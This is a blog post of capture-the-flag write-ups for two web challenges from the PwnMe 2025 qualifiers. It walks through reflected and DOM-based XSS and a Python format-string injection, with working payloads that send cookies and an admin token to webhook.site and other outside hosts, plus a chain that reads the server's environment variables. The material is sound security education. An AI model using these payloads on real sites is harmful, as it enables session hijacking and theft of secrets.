---
layout: post
title: PwnMe CTF Quals 2025 - Challenge Writeups
categories: [CTF Jeopardy]
tags: [ctf jeopardy,web]
permalink: /posts/pwnmectfquals2025
img_path: /images/ctfs/pwnmectfquals2025
image:
  path: icon.png
---

I participated in the PwnMe CTF Qualifiers 2025 online over 48 hours. I played with my university club [MQCyberSec](https://mqcybersec.org/), and we placed 97th of 955 teams. This CTF was an amazing, every challenge being of incredible quality

## Web

### Say My Name
> Just printing your name, what could go wrong ?

This was a medium whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Say_my_name)

#### Initial Look

The flag is stored in the environment variables of the application:

```yaml
services:
  saymyname:
    build: .
    image: saymyname:latest
    ports:
      - "5000:5000"
    environment:
      - FLAG=PWNME{FAKE_FLAG}
```

The program was simple, only having a few endpoints:

`app.py`:

```python
from flask import Flask, render_template, request, Response, redirect, url_for
from bot import visit_report
from secrets import token_hex

X_Admin_Token = token_hex(16)

def run_cmd(): # I will do that later
    pass

def sanitize_input(input_string):
    input_string = input_string.replace('<', '')
    input_string = input_string.replace('>', '')
    input_string = input_string.replace('\'', '')
    input_string = input_string.replace('&', '')
    input_string = input_string.replace('"', '\\"')
    input_string = input_string.replace(':', '')
    return input_string

app = Flask(__name__)

@app.route('/admin', methods=['GET'])
def admin():
    if request.cookies.get('X-Admin-Token') != X_Admin_Token:
        return 'Access denied', 403

    prompt = request.args.get('prompt')
    return render_template('admin.html', cmd=f"{prompt if prompt else 'prompt$/>'}{run_cmd()}".format(run_cmd))

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/your-name', methods=['POST'])
def your_name():
    if request.method == 'POST':
        name = request.form.get('name')
        return Response(render_template('your-name.html', name=sanitize_input(name)), content_type='text/html')

@app.route('/report', methods=['GET'])
def report():
    url = request.args.get('url')
    if url and (url.startswith('http://') or url.startswith('https://')):
        print(f'Visit : {url} | X-Admin-Token : {X_Admin_Token}')
        visit_report(url, X_Admin_Token)
    return redirect(url_for('index'))

app.run(debug=False, host='0.0.0.0')
```

The front page of the site was a simple name input field:

![saymynamemain.png](saymynamemain.png)

Inputting a name we are given the `/your-name` page response with our name on the page, cool!

![saymynamehello.png](saymynamehello.png)

Some initial observations:

- The webapp is running with Flask
- To access `/admin` we require a randomly generated `X_Admin_Token`
- `/your-name` takes a user input on POST and renders it after sanitising it

#### XSS

Looking at the sanitise first, it seems to not have a proper sanitisation of inputs.

```python
def sanitize_input(input_string):
    input_string = input_string.replace('<', '')
    input_string = input_string.replace('>', '')
    input_string = input_string.replace('\'', '')
    input_string = input_string.replace('&', '')
    input_string = input_string.replace('"', '\\"')
    input_string = input_string.replace(':', '')
    return input_string
```

It replaces `<`, `>`, `'`, `&` and `:` with nothing, but it replaces `"` with `\\"`.

Looking at the sanitisation of `your-name.html`, we can see the injection points and determine if we can exploit it.

```html
<div class="image-container">
  <img src="{{ url_for('static', filename='images/cat.jpg') }}" alt="cat" />
  <a
    class="text"
    id="behindthename-redirect"
    href="https://www.behindthename.com/names/search.php?terms={{name}}"
    onfocus='document.location="https://www.behindthename.com/names/search.php?terms={{name|safe}}"'
    >Hello {{name}} !</a
  >
</div>
```

So the injection points are of varying interest:

- The injection point inside the `<a>` isn't interesting as we can't create new tags without `<` and `>`.
- We can't escape the `href` with the `\"` method
- The injection point inside the `onfocus` is filtered through `safe`, but we can still achieve XSS!

`onfocus` as well as other `on` attributes can execute JavaScript. This particular one is using `document.location` to redirect the user, we can escape the string its redirecting to and add our own JavaScript!

Let's make a sample payload first for the `onfocus` attribute:
`\";console.log(1);//`

The reason this works is as `"` is replaced with `\"` when sanitised. If our input includes a backslash before we send our `"` we can escape the filtering backslash by doubling them up. This allows us to escape the `document.location` in `onfocus`.

E.g. `"` becomes:
```js
document.location="...?terms=\""
```

`\"` becomes:
```js
document.location="...?terms=\\""
```

This allows us to escape the string with our payload:
```js
document.location="...?terms=\\";console.log(1);//"
```

This should print `1` to the console before redirecting. Clicking the URL that's what we see!

![saymynamexss.png](saymynamexss.png)

#### XSS: Exfiltration

Let's use [`navigator`](https://developer.mozilla.org/en-US/docs/Web/API/Navigator) with a [`sendBeacon`](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon) to send a request to our webhook.site URL (which will be used to steal the `X_Admin_Token`) before it redirects!.

```
\";navigator.sendBeacon(`https${String.fromCharCode(58)}//webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1`);//
```

We use `${String.fromCharCode(58)}` as a representation for `:` as it is filtered in the sanitiser from earlier.

Sure enough we get a `POST` request from the webapp on webhook.site.

![saymyname-webhook.png](saymyname-webhook.png)

Now, we need to host a remote server to do this POST to exfiltrate the token.

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Test</title>
    </head>
    <body>
        <h2>XSS Exploit</h2>

        <form id="post-form" method="POST" action="http://127.0.0.1:5000/your-name#behindthename-redirect">
            <input type="hidden" name="name" value='solopieandsealldev\\";navigator.sendBeacon(`https${String.fromCharCode(58)}//webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1/?c=${document.cookie}`);//'>
            <input type="submit" value="Submit">
        </form>

        <script>
            document.getElementById('post-form').submit();
        </script>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

Let's host this code on `attacker.com`.

We can then send out attacker URL to the `/report` endpoint, have the bot visit our site, get the token back on webhook.site!

```bash
$ curl "http://localhost:5000/report?url=https://attacker.com"
```

We then get a response from the server, `https://webhook.site/9609b1f4-xxxx-xxxx-xxxx-177da4f9d6e1/?c=X-Admin-Token=68fd3889bf98101b1639d81d8428955d`

#### Python Format Strings

Woo! Now we can do that on remote and access `/admin`!

Looking closer at the `app.py` there is a vulnerability in `/admin`:

```python
@app.route('/admin', methods=['GET'])
def admin():
    if request.cookies.get('X-Admin-Token') != X_Admin_Token:
        return 'Access denied', 403

    prompt = request.args.get('prompt')
    return render_template('admin.html', cmd=f"{prompt if prompt else 'prompt$/>'}{run_cmd()}".format(run_cmd))
```

The `return render_template(...)` line has a Python format string vulnerability, as the string is a format string (indicated by the `f` at the start) and is then run with a `.format()`, meaning we can inject our own variables and potentially exfiltrate sensitive information.

I start with some simple payloads to test it: `{0.__globals__}`

We can send this on the `prompt` attribute on localhost to test: `http://localhost/admin?prompt={0.__globals__}`

This returns the globals of the current execution:

```
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7ff98d7d2220>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/app/app.py', '__cached__': None, 'Flask': <class 'flask.app.Flask'>, 'render_template': <function render_template at 0x7ff98c419040>, 'request': <Request 'http://localhost:5000/admin?prompt={0.__globals__}' [GET]>, 'Response': <class 'flask.wrappers.Response'>, 'redirect': <function redirect at 0x7ff98c5ac0d0>, 'url_for': <function url_for at 0x7ff98c618e50>, 'visit_report': <function visit_report at 0x7ff98c3dd670>, 'token_hex': <function token_hex at 0x7ff98c9ec940>, 'X_Admin_Token': '68fd3889bf98101b1639d81d8428955d', 'run_cmd': <function run_cmd at 0x7ff98d81d040>, 'sanitize_input': <function sanitize_input at 0x7ff98c0a9940>, 'app': <Flask 'app'>, 'admin': <function admin at 0x7ff98c1629d0>, 'index': <function index at 0x7ff98c162a60>, 'your_name': <function your_name at 0x7ff98c162c10>, 'report': <function report at 0x7ff98c162ca0>}None
```

We need to find a way to read the environment, generally this is stored in `os`. I start by looking in `Flask`:
`{0.__globals__[Flask].__dict__}`

This returns some information about the Flask app:

```
 {'__module__': 'flask.app', '__annotations__': {'request_class': 'type[Request]', 'response_class': 'type[Response]', 'session_interface': 'SessionInterface'}, '__doc__': "The flask object implements a WSGI application and acts as the central\n object. It is passed the name of the module or package of the\n application. Once it is created it will act as a central registry for\n the view functions, the URL rules, template configuration and much more.\n\n The name of the package is used to resolve resources from inside the\n package or the folder the module is contained in depending on if the\n package parameter ...: <function Flask.test_request_context at 0x7ff98c3dd4c0>, 'wsgi_app': <function Flask.wsgi_app at 0x7ff98c3dd550>, '__call__': <function Flask.__call__ at 0x7ff98c3dd5e0>}None
```

Inside this is `__init__`, we can use that to get to an initialised Flask:
`{0.__globals__[Flask].__init__.__globals__}`

```
 {'__name__': 'flask.app', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7ff98d71e400>, '__spec__': ModuleSpec(name='flask.app', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7ff98d71e400>, origin='/usr/local/lib/python3.9/site-packages/flask/app.py'), '__file__': '/usr/local/lib/python3.9/site-packages/flask/app.py', '__cached__': '/usr/local/lib/python3.9/site-packages/flask/__pycache__/app.cpython-39.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'annotations': _Feature((3, 7, 0, 'beta', 1), (3, 10, 0, 'alpha', 0), 16777216), 'cabc': <module 'collections.abc' from '/usr/local/lib/python3.9/collections/abc.py'>, 'os': <module 'os' from '/usr/local/lib/python3.9/os.py'>, 'sys': <module 'sys' (built-in)>, 't': <module 'typing' from '/usr/local/lib/python3.9/typing.py'>, 'weakref': <module 'weakref' from '/usr/local/lib/python3.9/weakref.py'>, 'timedelta': <class 'datetime.timedelta'>, 'iscoroutinefunction': <function iscoroutinefunction at 0x7ff98caf3550>, 'chain': <class 'itertools.chain'>, 'TracebackType': <class 'traceback'>, '_url_quote': <function quote at 0x7ff98d47ec10>, 'click': <module 'click' from '/usr/local/lib/python3.9/site-packages/click/__init__.py'>, 'Headers': <class 'werkzeug.datastructures.headers.Headers'>, 'ImmutableDict': <class 'werkzeug.datastructures.structures.ImmutableDict'>, 'BadRequestKeyError': <class 'werkzeug.exceptions.BadRequestKeyError'>, 'HTTPException': <class 'werkzeug.exceptions.HTTPException'>, 'InternalServerError': <class 'werkzeug.exceptions.InternalServerError'>, 'BuildError': <class 'werkzeug.routing.exceptions.BuildError'>, 'MapAdapter': <class 'werkzeug.routing.map.MapAdapter'>, 'RequestRedirect': <class 'werkzeug.routing.exceptions.RequestRedirect'>, 'RoutingException': <class 'werkzeug.routing.exceptions.RoutingException'>, 'Rule': <class 'werkzeug.routing.rules.Rule'>, 'is_running_from_reloader': <function is_running_from_reloader at 0x7ff98d5491f0>, 'BaseResponse': <class 'werkzeug.wrappers.response.Response'>, 'get_host': <function get_host at 0x7ff98c9de3a0>, 'cli': <module 'flask.cli' from '/usr/local/lib/python3.9/site-packages/flask/cli.py'>, 'ft': <module 'flask.typing' from '/usr/local/lib/python3.9/site-packages/flask/typing.py'>, 'AppContext': <class 'flask.ctx.AppContext'>, 'RequestContext': <class 'flask.ctx.RequestContext'>, '_cv_app': <ContextVar name='flask.app_ctx' at 0x7ff98d60b5e0>, '_cv_request': <ContextVar name='flask.request_ctx' at 0x7ff98d60b630>, 'current_app': <Flask 'app'>, 'g': <flask.g of 'app'>, 'request': <Request 'http://localhost:5000/admin?prompt={0.__globals__[Flask].__init__.__globals__}' [GET]>, 'request_ctx': <RequestContext 'http://localhost:5000/admin?prompt={0.__globals__[Flask].__init__.__globals__}' [GET] of app>, 'session': <NullSession {}>, 'get_debug_flag': <function get_debug_flag at 0x7ff98c618940>, 'get_flashed_messages': <function get_flashed_messages at 0x7ff98c5ac310>, 'get_load_dotenv': <function get_load_dotenv at 0x7ff98c6189d0>, 'send_from_directory': <function send_from_directory at 0x7ff98c5ac4c0>, 'App': <class 'flask.sansio.app.App'>, '_sentinel': <object object at 0x7ff98c795560>, 'SecureCookieSessionInterface': <class 'flask.sessions.SecureCookieSessionInterface'>, 'SessionInterface': <class 'flask.sessions.SessionInterface'>, 'appcontext_tearing_down': <blinker.base.NamedSignal object at 0x7ff98c63dee0; 'appcontext-tearing-down'>, 'got_request_exception': <blinker.base.NamedSignal object at 0x7ff98c63db50; 'got-request-exception'>, 'request_finished': <blinker.base.NamedSignal object at 0x7ff98c63dca0; 'request-finished'>, 'request_started': <blinker.base.NamedSignal object at 0x7ff98c63dd90; 'request-started'>, 'request_tearing_down': <blinker.base.NamedSignal object at 0x7ff98c63dd00; 'request-tearing-down'>, 'Environment': <class 'flask.templating.Environment'>, 'Request': <class 'flask.wrappers.Request'>, 'Response': <class 'flask.wrappers.Response'>, 'T_shell_context_processor': ~T_shell_context_processor, 'T_teardown': ~T_teardown, 'T_template_filter': ~T_template_filter, 'T_template_global': ~T_template_global, 'T_template_test': ~T_template_test, '_make_timedelta': <function _make_timedelta at 0x7ff98c7a3040>, 'Flask': <class 'flask.app.Flask'>}None
```

Inside this is the `os` module: `...  'os': <module 'os' from '/usr/local/lib/python3.9/os.py'>, ... `

We can then add `.environ` to get the environment variables:
`{0.__globals__[Flask].__init__.__globals__[os].environ}`

```
 environ({'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'HOSTNAME': '1d7438abd92d', 'FLAG': 'PWNME{FAKE_FLAG}', 'LANG': 'C.UTF-8', 'GPG_KEY': 'E3FF2839C048B25C084DEBE9B26995E310250568', 'PYTHON_VERSION': '3.9.4', 'PYTHON_PIP_VERSION': '21.1.1', 'PYTHON_GET_PIP_URL': 'https://github.com/pypa/get-pip/raw/1954f15b3f102ace496a34a013ea76b061535bd2/public/get-pip.py', 'PYTHON_GET_PIP_SHA256': 'f499d76e0149a673fb8246d88e116db589afbd291739bd84f2cd9a7bca7b6993', 'DEBIAN_FRONTEND': 'noninteractive', 'HOME': '/root', 'WERKZEUG_SERVER_FD': '3'})None
```

We get the sample flag!

#### Putting it all together

Let's do the steps on remote:

1. Trigger the request to the `/report` endpoint that exfiltrates the `X_Admin_Token` to our webserver.

```bash
$ curl "https://saymyname-c588791ba9cff43a.deploy.phreaks.fr/report?url=https://attacker.com"
```

We get the token on our webhook.site: `X-Admin-Token=17c738b0787c99a392debb90bf9b57be`

2. Use that token to get the flag from the Python format string vulnerability

```bash
$ curl -X GET "https://saymyname-c588791ba9cff43a.deploy.phreaks.fr/admin?prompt=%7B0.__globals__%5BFlask%5D.__init__.__globals__%5Bos%5D.environ%7D" --cookie "X-Admin-Token=17c738b0787c99a392debb90bf9b57be"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin</title>
</head>
<body>
    environ({&#39;PATH&#39;: &#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#39;, &#39;HOSTNAME&#39;: &#39;ctf-saymyname-c588791ba9cff43a-785bb6f958-qds96&#39;, &#39;LANG&#39;: &#39;C.UTF-8&#39;, &#39;GPG_KEY&#39;: &#39;E3FF2839C048B25C084DEBE9B26995E310250568&#39;, &#39;PYTHON_VERSION&#39;: &#39;3.9.4&#39;, &#39;PYTHON_PIP_VERSION&#39;: &#39;21.1.1&#39;, &#39;PYTHON_GET_PIP_URL&#39;: &#39;https://github.com/pypa/get-pip/raw/1954f15b3f102ace496a34a013ea76b061535bd2/public/get-pip.py&#39;, &#39;PYTHON_GET_PIP_SHA256&#39;: &#39;f499d76e0149a673fb8246d88e116db589afbd291739bd84f2cd9a7bca7b6993&#39;, &#39;DEBIAN_FRONTEND&#39;: &#39;noninteractive&#39;, &#39;FLAG&#39;: &#39;PWNME{b492b312612c741b3b6597f925f88198}&#39;, &#39;KUBERNETES_SERVICE_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_SERVICE_PORT_HTTPS&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT&#39;: &#39;tcp://34.118.224.1:443&#39;, &#39;KUBERNETES_PORT_443_TCP&#39;: &#39;tcp://34.118.224.1:443&#39;, &#39;KUBERNETES_PORT_443_TCP_PROTO&#39;: &#39;tcp&#39;, &#39;KUBERNETES_PORT_443_TCP_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP_ADDR&#39;: &#39;34.118.224.1&#39;, &#39;KUBERNETES_SERVICE_HOST&#39;: &#39;34.118.224.1&#39;, &#39;HOME&#39;: &#39;/root&#39;, &#39;WERKZEUG_SERVER_FD&#39;: &#39;3&#39;})None
</body>
</html>
```

3. Profit

Flag: <mark>PWNME{b492b312612c741b3b6597f925f88198}</mark>

In the Discord user `lambdamancer` made this flow diagram of the attack:
![saymynameflow.png](saymynameflow.png) 

### Hack the Bot 1
> I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it ?

This was a medium whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Hack_the_bot_1)

#### Initial Look

The first flag is stored in a cookie that the bot will have.

```js
const express = require("express");
const path = require("path");
const fs = require("fs");
const { spawn } = require("child_process");
const puppeteer = require("puppeteer");
const { format } = require("date-fns");

const app = express();
const port = 5000;

const logPath = "/tmp/bot_folder/logs/";
const browserCachePath = "/tmp/bot_folder/browser_cache/";

const cookie = {
  name: "Flag",
  value: "PWNME{FAKE_FLAG}",
  sameSite: "Strict",
};

app.use(express.urlencoded({ extended: true }));

app.use(express.static(path.join(__dirname, "public")));

app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

if (!fs.existsSync(logPath)) {
  fs.mkdirSync(logPath, { recursive: true });
}

if (!fs.existsSync(browserCachePath)) {
  fs.mkdirSync(browserCachePath, { recursive: true });
}

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function startBot(url, name) {
  const logFilePath = path.join(logPath, `${name}.log`);

  try {
    const logStream = fs.createWriteStream(logFilePath, { flags: "a" });
    logStream.write(`${new Date()} : Attempting to open website ${url}\n`);

    const browser = await puppeteer.launch({
      headless: "new",
      args: [
        "--remote-allow-origins=*",
        "--no-sandbox",
        "--disable-dev-shm-usage",
        `--user-data-dir=${browserCachePath}`,
      ],
    });

    const page = await browser.newPage();
    await page.goto(url);

    if (url.startsWith("http://localhost/")) {
      await page.setCookie(cookie);
    }

    logStream.write(`${new Date()} : Successfully opened ${url}\n`);

    await sleep(7000);
    await browser.close();

    logStream.write(`${new Date()} : Finished execution\n`);
    logStream.end();
  } catch (e) {
    const logStream = fs.createWriteStream(logFilePath, { flags: "a" });
    logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
    logStream.end();
  }
}

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/report", (req, res) => {
  res.render("report");
});

app.post("/report", (req, res) => {
  const url = req.body.url;
  const name = format(new Date(), "yyMMdd_HHmmss");
  startBot(url, name);
  res.status(200).send(`logs/${name}.log`);
});

app.listen(port, () => {
  console.log(`App running at http://0.0.0.0:${port}`);
});
```

Initial observations:
- Using `express`
- Using `puppeteer` for the bot on `/report`

We need to find some sort of URL inside the applicataion (restricted by the `url.startwith("http://localhost/")`) to set the cookie then exfiltrate the cookie contents.

The general function of the application is that is displays some articles and we can report a URL to the bot:
![hackthebot1articles.png](hackthebot1articles.png)

#### DOM XSS

Looking at the functionality of search, the source code `source/public/js/script.js` reveals a vulnerability:

```js
function getSearchQuery() {
    const params = new URLSearchParams(window.location.search);
    // Utiliser une valeur par défaut de chaîne vide si le paramètre n'existe pas
    return params.get('q') ? params.get('q').toLowerCase() : '';
}

...

function searchArticles(searchInput = document.getElementById('search-input').value.toLowerCase().trim()) {
    const searchWords = searchInput.split(/[^\p{L}]+/u);
    console.log(searchWords);
    const articles = document.querySelectorAll('.article-box');
    let found = false;
    articles.forEach(article => {
        if (searchInput === '') {
            article.style.display = '';
            found = true;
        } else {
            const articleText = article.textContent.toLowerCase();
            const isMatch = searchWords.some(word => word && new RegExp(`${word}`, 'ui').test(articleText));
            console.log(isMatch);
            if (isMatch) {
                article.style.display = '';
                found = true;
            } else {
                article.style.display = 'none';
            }
        }
    });
    const noMatchMessage = document.getElementById('no-match-message');
    if (!found && searchInput) {
        noMatchMessage.innerHTML = `No results for "${searchInput}".`;
        noMatchMessage.style.display = 'block';
    } else {
        noMatchMessage.style.display = 'none';
    }
}
```

Reading through the functions, this snippet grabs my attention:

```js
const noMatchMessage = document.getElementById("no-match-message");
if (!found && searchInput) {
  noMatchMessage.innerHTML = `No results for "${searchInput}".`;
  noMatchMessage.style.display = "block";
} else {
  noMatchMessage.style.display = "none";
}
```

If there is no result, the user input is mirrored to the innerHTML, this is a DOM XSS!

We can test this using an `<input>` field.

![hackthebot1input.png](hackthebot1input.png)

We can also use `autofocus` to automatically focus on the field with the payload: `<input autofocus>`.

Now, we just add XSS with `onfocus`: `<input autofocus onfocus="">` and that should be fin-

Oh. It's in the article .w.

![hackthebot1inpurtonfocus.png](hackthebot1inpurtonfocus.png)

So we need to find some other attribute, we used `onfocusin`:

```
<input autofocus onfocusin=confirm()>
```

We now get a confirm alert box:
![hackthebox1confirm.png](hackthebox1confirm.png)

#### XSS: Exfiltration Efforts

We now need to just do a `fetch()` to send a web request with the cookies. This turned out to be alot more of a pain due to how it selects its words.

```js
function searchArticles(searchInput = document.getElementById('search-input').value.toLowerCase().trim()) {
...
const searchWords = searchInput.split(/[^\p{L}]+/u);
...
const articleText = article.textContent.toLowerCase();
const isMatch = searchWords.some(word => word && new RegExp(`${word}`, 'ui').test(articleText));
...
}
```

- We can't use capital letters due to the `.toLowerCase().trim()` on the input of the function.
- The regex `/[^\p{L}]+/u` means any amount of any non-unicode letter, splitting by this means we can't use alternatives to characters outside of the usual unicode letterspace, they are all spaces.
- The `isMatch` then checks for and regex pattern with that string ignoring case and being unicode-aware.
- `some()` returns if ANY are found of any amount

This made avoiding the string collisions challenging, but the workaround we found utilised `.substr()`.

We were able to wrap a built string in `eval()` to achieve the XSS exfiltration:

```js
<input onfocusin="eval('fetcha'.substr(0,5)+'(\''+'httpa'.substr(0,4)+'://exam'+'.pla'.substr(0,2)+'eex.'+'coma'.substr(0,3)+'/?yeet='+btoa(document.cookie)+'\')')" autofocus>
```

This works for local (sometimes) but because the cookie is set after we can't rely on this for remote, we want to write a script that wait's for cookies to exist (or delays) then grabs the cookies.

We had two solutions for this challenge (but I will outline some more at the end for learning).

```js
"set" +
eval("'\\xa".substr(0, 3) + "54" + "'") +
"imeout(function(){" +
"fetcha".substr(0, 5) +
"('" +
"httpa".substr(0, 4) +
"://example" +
".pla".substr(0, 2) +
"eex." +
"coma".substr(0, 3) +
"/?yeet='+btoa(document.cookie))},2000)";
```

As caps were blocked, we needed to use an eval inside the eval to create a capital letter to build the `setTimeout` function name, that's what `eval('\'\\xa'.substr(0,3) + '54' + '\'')` is for. This builds `\x54` which results in `T`.

In a readable format we get:
```js
setTimeout(function(){fetch('http://example.peex.com/?yeet='+btoa(document.cookie))},2000)"
```

The final payload URL that we report is:
```
http://localhost/?q=%3Cinput%20onfocusin%3D%22eval%28set%22%20%2Beval%28%22%27%5C%5Cxa%22%2Esubstr%280%2C%203%29%20%2B%20%2254%22%20%2B%20%22%27%22%29%20%2B%22imeout%28function%28%29%7B%22%20%2B%22fetcha%22%2Esubstr%280%2C%205%29%20%2B%22%28%27%22%20%2B%22httpa%22%2Esubstr%280%2C%204%29%20%2B%22%3A%2F%2Fexample%22%20%2B%22%2Epla%22%2Esubstr%280%2C%202%29%20%2B%22eex%2E%22%20%2B%22coma%22%2Esubstr%280%2C%203%29%20%2B%22%2F%3Fyeet%3D%27%2Bbtoa%28document%2Ecookie%29%29%7D%2C2000%29%29%22%3B%20autofocus%3E
```

This worked to grab the cookies from the remote, resulting in the flag:

Flag: `PWNME{D1d_y5U_S4iD-F1lt33Rs?}`

